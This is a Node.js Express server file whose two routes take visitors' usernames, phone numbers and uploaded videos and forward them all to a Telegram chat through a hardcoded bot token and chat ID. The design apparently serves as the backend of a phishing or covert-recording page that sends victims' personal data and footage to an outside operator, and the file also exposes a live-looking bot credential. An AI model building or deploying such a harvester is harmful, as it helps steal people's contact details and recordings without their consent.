const express = require("express");
const multer = require("multer");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");
const ffmpeg = require("fluent-ffmpeg");
const ffmpegPath = require("ffmpeg-static"); // ✅ ADDED THIS
const path = require("path");

// Tell fluent-ffmpeg where the executable is
ffmpeg.setFfmpegPath(ffmpegPath); // ✅ ADDED THIS

const app = express();
app.use(cors());
app.use(express.json()); 

app.use(express.static("public"));

// Ensure uploads folder exists
if (!fs.existsSync("uploads")) {
    fs.mkdirSync("uploads");
}

// =====================
// 📁 FILE STORAGE
// =====================
const storage = multer.diskStorage({
    destination: "uploads/",
    filename: (req, file, cb) => {
        const ext = file.originalname.split(".").pop() || "webm";
        cb(null, `${Date.now()}.${ext}`); 
    }
});

const upload = multer({ storage });

// =====================
// 🔑 CONFIG
// =====================
const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc";
const CHAT_ID = "8280326139";

// =====================
// 📱 LOG PHONE DATA
// =====================
app.post("/send-phone", async (req, res) => {
    const { username, phone } = req.body;
    const text = `👤 **New User**\n\nUsername: ${username}\nPhone: ${phone}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: "Markdown"
        });
        res.status(200).send("Logged");
    } catch (err) {
        console.error("Telegram Log Error:", err.message);
        res.status(500).send("Error logging data");
    }
});

// =====================
// 🚀 UPLOAD VIDEO ROUTE
// =====================
app.post("/upload", upload.single("video"), async (req, res) => {
    try {
        if (!req.file) return res.status(400).send("No file uploaded");

        console.log("📁 File path:", req.file.path);

        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
            {
                chat_id: CHAT_ID,
                video: fs.createReadStream(req.file.path)
            },
            {
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }
        );

        console.log("✅ Telegram response:", response.data);

        fs.unlinkSync(req.file.path);

        res.send("Upload successful");
    } catch (err) {
        console.error("❌ FULL ERROR:", err.response?.data || err.message);

        if (req.file && fs.existsSync(req.file.path)) {
            fs.unlinkSync(req.file.path);
        }

        res.status(500).send("Upload failed");
    }
});

// Use the PORT environment variable Render provides, or default to 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
